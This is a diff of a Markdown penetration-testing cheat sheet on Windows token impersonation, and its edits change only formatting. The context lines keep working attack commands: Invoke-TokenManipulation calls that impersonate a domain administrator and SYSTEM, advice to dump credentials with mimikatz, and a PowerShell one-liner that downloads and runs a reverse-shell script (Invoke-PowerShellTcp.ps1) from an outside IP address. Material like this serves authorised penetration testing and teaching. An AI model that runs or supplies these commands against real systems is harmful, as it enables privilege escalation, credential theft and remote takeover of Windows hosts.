@@ -1,6 +1,6 @@
 # Token Impersonation
 
-Token impersonation is a technique through which a Windows local administrator could steal another user’s security token in order to impersonate and effectively execute commands as that user.
+#### <mark style="color:green;">Token impersonation is a technique through which a Windows local administrator could steal another user’s security token in order to impersonate and effectively execute commands as that user.</mark>
 
 That are certain privileges in Windows that, if enabled, could lead to an attacker escalating privileges to SYSTEM or any other user account with an active and valid token on that system, through various tools that have been designed to specifically exploit this vulnerability.
 
@@ -51,7 +51,7 @@ impersonate_token megacorp\\administrator
 
 Invokes token impersonation as a domain user. If this doesn't work you can try impersonating SYSTEM and then dumping credentials using mimikatz.
 
-```
+```powershell
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
@@ -61,7 +61,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
 
 As a replacement for the last command you could do, but be vary of special characters in the command like `"` and `'`
 
-```
+```powershell
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
 
